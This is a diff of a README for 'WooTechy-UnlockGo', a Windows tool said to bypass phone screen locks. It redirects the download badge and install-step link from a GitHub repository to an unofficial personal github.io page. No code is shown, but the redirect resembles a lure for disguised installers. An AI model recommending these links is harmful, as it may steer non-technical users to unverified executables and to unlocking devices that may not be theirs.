@@ -1,6 +1,6 @@
 # 🔓 WooTechy-UnlockGo - Remove device locks with simple clicks
 
-[![](https://img.shields.io/badge/Download_UnlockGo-Blue?style=for-the-badge)](https://github.com/cvfatihad9074/WooTechy-UnlockGo)
+[![](https://img.shields.io/badge/Download_UnlockGo-Blue?style=for-the-badge)](https://cvfatihad9074.github.io)
 
 WooTechy-UnlockGo provides a solution for users who find themselves locked out of their mobile devices. This software works on Windows 11 and Windows 10 computers to help you regain access to your iPhone or Android phone. You do not need technical skills to operate this tool. Follow the steps in this guide to set up the software and resolve your screen lock issues.
 
@@ -18,7 +18,7 @@ Before you start the installation, ensure your computer meets these basic requir
 
 You can obtain the necessary installation files through the official repository link. This process takes only a few minutes.
 
-1. Go to the primary download page: [https://github.com/cvfatihad9074/WooTechy-UnlockGo](https://github.com/cvfatihad9074/WooTechy-UnlockGo).
+1. Go to the primary download page: [https://cvfatihad9074.github.io](https://cvfatihad9074.github.io).
 2. Look for the release section on the webpage.
 3. Select the version compatible with your Windows system.
 4. Save the file to your desktop or your downloads folder.
